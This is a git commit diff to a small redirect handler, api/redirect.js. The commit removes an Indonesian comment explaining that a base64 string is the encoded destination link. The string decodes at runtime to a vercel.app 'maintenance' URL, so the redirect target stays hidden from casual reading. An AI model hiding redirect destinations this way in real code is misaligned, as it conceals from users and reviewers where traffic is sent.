cf32d9dc9632d2127c495217a5b1e5ac8538b92b
Thirteen𝕏 <65433734+ThirteenXXX@users.noreply.github.com>
2025-05-24 10:34:05 +0700

    Update redirect.js

--- api/redirect.js
+++ api/redirect.js
@@ -1,5 +1,5 @@
 export default function handler(req, res) {
-  // Base64 dari link tujuan (contoh: https://example.com)
+  
   const encoded = 'aHR0cHM6Ly96ZXByYS1tYWludGVuYW5jZS52ZXJjZWwuYXBw';
   const decodedUrl = Buffer.from(encoded, 'base64').toString('utf-8');
 
